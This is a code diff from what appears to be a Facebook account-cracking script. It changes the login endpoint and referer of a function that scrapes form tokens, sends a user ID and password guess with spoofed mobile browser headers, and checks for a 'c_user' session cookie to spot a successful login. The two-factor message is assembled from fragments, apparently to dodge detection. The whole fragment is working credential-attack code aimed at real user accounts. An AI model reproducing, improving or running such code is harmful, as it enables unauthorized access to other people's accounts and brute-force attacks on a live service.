@@ -2054,7 +2054,7 @@ def mobile(uid,pwx,tl):
             "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1)}
             headers ={
-            'Host': 'business.facebook.com',
+            'Host': 'm.facebook.com',
             'cache-control': 'max-age=0',
             'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"',
             'sec-ch-ua-mobile': '?1',
@@ -2068,12 +2068,12 @@ def mobile(uid,pwx,tl):
             'sec-fetch-site': 'same-origin',
             'sec-fetch-mode': 'cors',
             'sec-fetch-dest': 'empty',
-            'referer': 'https://business.facebook.com/login/device-based/password/?uid=' + uid + '&flow=login_no_pin&refsrc=deprecated&_rdr',
+            'referer': 'https://m.facebook.com/login/device-based/password/?uid=' + uid + '&flow=login_no_pin&refsrc=deprecated&_rdr',
             'accept-encoding': 'gzip, deflate, br',
             'accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
             'connection': 'close'}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://business.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028"
+            url = "https://m.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028"
             po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
